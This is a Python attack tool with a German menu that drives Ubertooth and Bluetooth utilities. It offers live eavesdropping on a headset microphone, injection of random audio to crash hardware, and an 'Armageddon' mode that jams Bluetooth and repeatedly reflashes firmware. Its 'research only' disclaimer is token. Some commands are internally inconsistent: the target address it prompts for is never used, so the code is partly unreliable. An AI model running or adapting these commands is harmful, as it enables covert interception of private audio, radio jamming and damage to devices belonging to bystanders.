#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# UBERTOOTH EVIL MODE v666 - Nur für legitime Forschung!
import os
import sys
import subprocess
from datetime import datetime
import signal
import colorama
from colorama import Fore, Style

colorama.init()

class UberDevil:
    def __init__(self):
        self.running = True
        self.active_attacks = []
        signal.signal(signal.SIGINT, self.signal_handler)
    
    def signal_handler(self, sig, frame):
        print(f"\n{Fore.RED}💀 KILLING ALL ATTACKS!{Style.RESET_ALL}")
        self.cleanup()
        sys.exit(0)

    def cleanup(self):
        for proc in self.active_attacks:
            os.system(f"kill -9 {proc.pid} 2>/dev/null")
        os.system("pkill -f 'ubertooth|hstest|sox'")

    def run_demonic(self, cmd, bg=False):
        try:
            print(f"{Fore.RED}🔥 {cmd}{Style.RESET_ALL}")
            proc = subprocess.Popen(
                cmd, 
                shell=True,
                stdout=subprocess.PIPE if not bg else subprocess.DEVNULL,
                stderr=subprocess.PIPE,
                preexec_fn=os.setsid
            )
            if bg:
                self.active_attacks.append(proc)
            return proc
        except Exception as e:
            print(f"{Fore.RED}💥 ERROR: {e}{Style.RESET_ALL}")
            return None

    def live_mic_spy(self):
        self.run_demonic(
            "hcitool scan && "
            "read -p 'Target BDADDR: ' bdaddr && "
            "hstest -r 8000 -b 16 -c 1 | "
            "sox -t raw -r 8000 -b 16 -c 1 -e signed-integer - -t wav - | aplay -",
            bg=True
        )

    def evil_audio(self):
        self.run_demonic(
            "dd if=/dev/urandom bs=16000 count=1000 | "
            "hstest /dev/stdin -s 44100 -b 16 -c 1",
            bg=True
        )

    def bt_armageddon(self):
        print(f"{Fore.RED}🚨 STARTING BLUETOOTH APOCALYPSE{Style.RESET_ALL}")
        self.run_demonic("ubertooth-jam -b -H -P 100", bg=True)
        self.run_demonic("ubertooth-bt -J -H -P 100", bg=True)
        self.run_demonic("for i in {1..10}; do ubertooth-dfu -d bluetooth_rxtx.dfu -U; done", bg=True)

if __name__ == "__main__":
    if os.geteuid() != 0:
        print(f"{Fore.RED}🚫 DU MUSST ROOT SEIN!{Style.RESET_ALL}")
        sys.exit(1)
    
    devil = UberDevil()
    print(f"\n{Fore.MAGENTA}=== UBERTOOTH EVIL CONTROL CENTER ==={Style.RESET_ALL}")
    print("1. Live Mikrofon-Abhören (Headset Hijack)")
    print("2. Audio-Injection (Hardware-Crash)")
    print("3. Bluetooth-Armageddon (Jam + Brick)")
    print("4. EXIT (Cleanup)")
    
    choice = input("\nWÄHLE DEINE WAFFE: ")
    
    if choice == "1":
        devil.live_mic_spy()
    elif choice == "2":
        devil.evil_audio()
    elif choice == "3":
        devil.bt_armageddon()
    elif choice == "4":
        devil.cleanup()
    else:
        print(f"{Fore.RED}Falsche Eingabe!{Style.RESET_ALL}")
    
    input("\nDrücke Enter zum Beenden...")
    devil.cleanup()
